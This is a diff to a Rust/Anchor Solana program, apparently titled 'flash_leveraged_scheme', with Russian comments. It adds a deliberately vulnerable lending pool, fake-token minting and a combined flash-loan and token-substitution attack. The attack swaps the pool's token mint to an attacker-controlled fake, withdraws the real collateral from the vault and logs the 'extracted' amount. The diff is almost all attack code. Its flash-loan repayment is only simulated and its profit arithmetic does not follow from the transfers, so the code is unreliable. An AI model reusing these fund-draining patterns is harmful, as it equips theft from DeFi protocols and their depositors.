@@ -8,6 +8,9 @@ pub use collateral_swap::*;
 pub mod custom_lending;
 pub use custom_lending::*;
 
+pub mod token_substitution;
+pub use token_substitution::*;
+
 declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");
 
 #[program]
@@ -578,6 +581,176 @@ pub mod flash_leveraged_scheme {
         
         Ok(())
     }
+
+    /// Инициализация уязвимого lending протокола для демонстрации атак
+    pub fn initialize_vulnerable_lending(
+        ctx: Context<InitializeVulnerableLending>,
+        bump: u8,
+    ) -> Result<()> {
+        VulnerableLendingPool::initialize_vulnerable(ctx, bump)
+    }
+
+    /// Создание поддельного токена для атаки подменой
+    pub fn create_fake_token_for_substitution(
+        ctx: Context<CreateFakeToken>,
+    ) -> Result<()> {
+        VulnerableLendingPool::create_fake_token(ctx)
+    }
+
+    /// 🎭 ВЫПОЛНЕНИЕ АТАКИ ПОДМЕНОЙ ТОКЕНОВ
+    pub fn execute_token_substitution_attack(
+        ctx: Context<ExecuteTokenSubstitution>,
+        collateral_amount: u64,
+        borrow_amount: u64,
+    ) -> Result<()> {
+        VulnerableLendingPool::substitute_token_address(ctx, collateral_amount, borrow_amount)
+    }
+
+    /// Восстановление оригинального адреса токена
+    pub fn restore_token_address(
+        ctx: Context<RestoreTokenAddress>,
+    ) -> Result<()> {
+        VulnerableLendingPool::restore_original_token_address(ctx)
+    }
+
+    /// Демонстрация уязвимости в протоколе
+    pub fn demonstrate_token_substitution_vulnerability(
+        ctx: Context<ExecuteTokenSubstitution>,
+    ) -> Result<()> {
+        VulnerableLendingPool::demonstrate_vulnerability(ctx)
+    }
+
+    /// 🚀 КОМПЛЕКСНАЯ АТАКА: Флеш-займ + Подмена токенов + Вывод
+    pub fn execute_flash_loan_with_token_substitution(
+        ctx: Context<FlashLoanTokenSubstitution>,
+        flash_loan_amount: u64,
+        collateral_amount: u64,
+        borrow_amount: u64,
+    ) -> Result<()> {
+        msg!("🎭 EXECUTING FLASH LOAN WITH TOKEN SUBSTITUTION ATTACK");
+        msg!("Flash loan: {}, Collateral: {}, Borrow: {}", 
+             flash_loan_amount, collateral_amount, borrow_amount);
+        
+        // Этап 1: Берем флеш-займ реальных токенов
+        // (реализуется через стандартный флеш-займ механизм)
+        
+        // Этап 2: Размещаем реальные токены как залог
+        let deposit_real = CpiContext::new(
+            ctx.accounts.token_program.to_account_info(),
+            Transfer {
+                from: ctx.accounts.attacker_token_account.to_account_info(),
+                to: ctx.accounts.vulnerable_vault.to_account_info(),
+                authority: ctx.accounts.attacker.to_account_info(),
+            },
+        );
+        token::transfer(deposit_real, collateral_amount)?;
+        
+        // Этап 3: Занимаем против залога
+        let vulnerable_pool = &ctx.accounts.vulnerable_lending;
+        let pool_seeds = &[
+            b"vulnerable_lending",
+            vulnerable_pool.current_token_mint.as_ref(),
+            &[vulnerable_pool.bump],
+        ];
+        let signer = &[&pool_seeds[..]];
+        
+        let borrow_real = CpiContext::new_with_signer(
+            ctx.accounts.token_program.to_account_info(),
+            Transfer {
+                from: ctx.accounts.vulnerable_vault.to_account_info(),
+                to: ctx.accounts.attacker_token_account.to_account_info(),
+                authority: ctx.accounts.vulnerable_lending.to_account_info(),
+            },
+            signer,
+        );
+        token::transfer(borrow_real, borrow_amount)?;
+        
+        // Этап 4: Возвращаем флеш-займ из заемных средств
+        let flash_fee = flash_loan_amount * 50 / 10000; // 0.5%
+        let total_repayment = flash_loan_amount + flash_fee;
+        
+        // Имитируем возврат флеш-займа
+        msg!("Repaying flash loan: {} + {} fee = {}", flash_loan_amount, flash_fee, total_repayment);
+        
+        // Этап 5: 🎭 ПОДМЕНА ТОКЕНА И ВЫВОД ЗАЛОГА
+        msg!("🚨 EXECUTING TOKEN SUBSTITUTION");
+        
+        // Подменяем адрес токена в уязвимом протоколе
+        let vulnerable_pool = &mut ctx.accounts.vulnerable_lending;
+        let original_token = vulnerable_pool.current_token_mint;
+        vulnerable_pool.current_token_mint = ctx.accounts.fake_token_mint.key();
+        vulnerable_pool.is_substitution_active = true;
+        
+        // Минтим поддельные токены
+        let fake_mint_seeds = &[
+            b"fake_mint_authority",
+            ctx.accounts.attacker.key().as_ref(),
+            &[ctx.bumps.fake_mint_authority],
+        ];
+        let fake_signer = &[&fake_mint_seeds[..]];
+        
+        let mint_fake = CpiContext::new_with_signer(
+            ctx.accounts.token_program.to_account_info(),
+            token::MintTo {
+                mint: ctx.accounts.fake_token_mint.to_account_info(),
+                to: ctx.accounts.attacker_fake_token_account.to_account_info(),
+                authority: ctx.accounts.fake_mint_authority.to_account_info(),
+            },
+            fake_signer,
+        );
+        token::mint_to(mint_fake, collateral_amount)?;
+        
+        // "Выводим" залог (протокол думает что это поддельные токены)
+        let withdraw_real = CpiContext::new_with_signer(
+            ctx.accounts.token_program.to_account_info(),
+            Transfer {
+                from: ctx.accounts.vulnerable_vault.to_account_info(),
+                to: ctx.accounts.attacker_token_account.to_account_info(),
+                authority: ctx.accounts.vulnerable_lending.to_account_info(),
+            },
+            signer,
+        );
+        token::transfer(withdraw_real, collateral_amount)?;
+        
+        // Сжигаем поддельные токены
+        let burn_fake = CpiContext::new(
+            ctx.accounts.token_program.to_account_info(),
+            token::Burn {
+                mint: ctx.accounts.fake_token_mint.to_account_info(),
+                from: ctx.accounts.attacker_fake_token_account.to_account_info(),
+                authority: ctx.accounts.attacker.to_account_info(),
+            },
+        );
+        token::burn(burn_fake, collateral_amount)?;
+        
+        // Восстанавливаем оригинальный адрес токена
+        vulnerable_pool.current_token_mint = original_token;
+        vulnerable_pool.is_substitution_active = false;
+        
+        msg!("🎉 FLASH LOAN + TOKEN SUBSTITUTION ATTACK COMPLETED!");
+        msg!("Net result: {} real tokens extracted", collateral_amount - total_repayment);
+        
+        Ok(())
+    }
+
+    /// Демонстрация различных техник подмены
+    pub fn demo_storage_manipulation(
+        ctx: Context<ExecuteTokenSubstitution>,
+    ) -> Result<()> {
+        storage_manipulation_demo(ctx)
+    }
+
+    pub fn demo_proxy_substitution(
+        ctx: Context<ExecuteTokenSubstitution>,
+    ) -> Result<()> {
+        proxy_substitution_demo(ctx)
+    }
+
+    pub fn demo_reentrancy_substitution(
+        ctx: Context<ExecuteTokenSubstitution>,
+    ) -> Result<()> {
+        reentrancy_substitution_demo(ctx)
+    }
 }
 
 // Структуры данных
@@ -909,6 +1082,36 @@ pub struct CollateralExtractionScheme<'info> {
     
     #[account(mut)]
     pub custom_vault: Account<'info, TokenAccount>,
+    
+    pub token_program: Program<'info, Token>,
+}
+
+#[derive(Accounts)]
+pub struct FlashLoanTokenSubstitution<'info> {
+    #[account(mut)]
+    pub attacker: Signer<'info>,
+    
+    #[account(mut)]
+    pub vulnerable_lending: Account<'info, VulnerableLendingPool>,
+    
+    #[account(mut)]
+    pub attacker_token_account: Account<'info, TokenAccount>,
+    
+    #[account(mut)]
+    pub attacker_fake_token_account: Account<'info, TokenAccount>,
+    
+    #[account(mut)]
+    pub fake_token_mint: Account<'info, Mint>,
+    
+    /// CHECK: Authority для поддельного токена
+    #[account(
+        seeds = [b"fake_mint_authority", attacker.key().as_ref()],
+        bump,
+    )]
+    pub fake_mint_authority: AccountInfo<'info>,
+    
+    #[account(mut)]
+    pub vulnerable_vault: Account<'info, TokenAccount>,
     
     pub token_program: Program<'info, Token>,
 }
